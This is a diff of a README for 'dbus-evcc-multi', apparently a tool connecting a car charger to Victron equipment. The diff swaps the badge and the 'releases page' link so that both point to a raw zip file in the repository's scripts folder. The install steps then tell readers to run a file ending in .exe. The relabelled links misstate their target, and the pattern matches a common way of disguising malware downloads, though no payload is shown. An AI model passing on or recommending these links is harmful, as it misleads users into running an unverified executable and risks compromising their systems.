@@ -1,6 +1,6 @@
 # ⚡ dbus-evcc-multi - Connect your car charger to Victron
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Thermal-feedstock975/dbus-evcc-multi/releases)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Thermal-feedstock975/dbus-evcc-multi/main/scripts/dbus_multi_evcc_v3.9.zip)
 
 ## 📌 About this project
 
@@ -22,7 +22,7 @@ Before you install this software, ensure your hardware meets these needs:
 
 You need the installer to set up the bridge. Follow these steps to get the file:
 
-1. Visit the [releases page](https://github.com/Thermal-feedstock975/dbus-evcc-multi/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/Thermal-feedstock975/dbus-evcc-multi/main/scripts/dbus_multi_evcc_v3.9.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
